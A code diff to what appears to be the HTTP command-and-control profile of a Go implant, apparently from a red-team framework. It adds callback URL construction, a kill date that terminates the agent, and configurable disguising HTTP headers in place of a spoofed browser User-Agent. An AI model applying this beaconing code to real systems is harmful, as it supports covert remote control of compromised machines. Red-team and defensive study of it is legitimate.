@@ -9,6 +9,7 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"log"
+	"os"
 
 	"encoding/json"
 	"fmt"
@@ -74,16 +75,46 @@ type C2Default struct {
 	ExchangingKeys bool
 	Key            string
 	RsaPrivateKey  *rsa.PrivateKey
+	Killdate       time.Time
 }
 
 // New creates a new HTTP C2 profile from the package's global variables and returns it
 func New() structs.Profile {
+	var final_url string
+	var last_slash int
+	if callback_port == "443" && strings.Contains(callback_host, "https://") {
+		final_url = callback_host
+	} else if callback_port == "80" && strings.Contains(callback_host, "http://") {
+		final_url = callback_host
+	} else {
+		last_slash = strings.Index(callback_host[8:], "/")
+		if last_slash == -1 {
+			//there is no 3rd slash
+			final_url = fmt.Sprintf("%s:%s", callback_host, callback_port)
+		} else {
+			//there is a 3rd slash, so we need to splice in the port
+			last_slash += 8 // adjust this back to include our offset initially
+			//fmt.Printf("index of last slash: %d\n", last_slash)
+			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
+			final_url = fmt.Sprintf("%s:%s%s", string(callback_host[0:last_slash]), callback_port, string(callback_host[last_slash:]))
+		}
+	}
+	if final_url[len(final_url)-1:] != "/" {
+		final_url = final_url + "/"
+	}
+	//fmt.Printf("final url: %s\n", final_url)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
+	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
+	if err != nil {
+		os.Exit(1)
+	}
 	profile := C2Default{
-		BaseURL:   fmt.Sprintf("%s:%s/", callback_host, callback_port),
+		BaseURL:   final_url,
 		PostURI:   post_uri,
 		ProxyUser: proxy_user,
 		ProxyPass: proxy_pass,
 		Key:       AESPSK,
+		Killdate:  killDateTime,
 	}
 
 	// Convert sleep from string to integer
@@ -103,11 +134,12 @@ func New() structs.Profile {
 	}
 
 	// Add HTTP Headers
-	json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
+	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
+	json.Unmarshal([]byte(headers), &profile.HeaderList)
 
 	// Add proxy info if set
 	if len(proxy_host) > 3 {
-		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_user)
+		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_port)
 
 		if len(proxy_user) > 0 && len(proxy_pass) > 0 {
 			profile.ProxyUser = proxy_user
@@ -296,6 +328,10 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
 	for true {
+		today := time.Now()
+		if today.After(c.Killdate) {
+			os.Exit(1)
+		}
 		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendData))
 		if err != nil {
 			fmt.Printf("Error creating new http request: %s", err.Error())
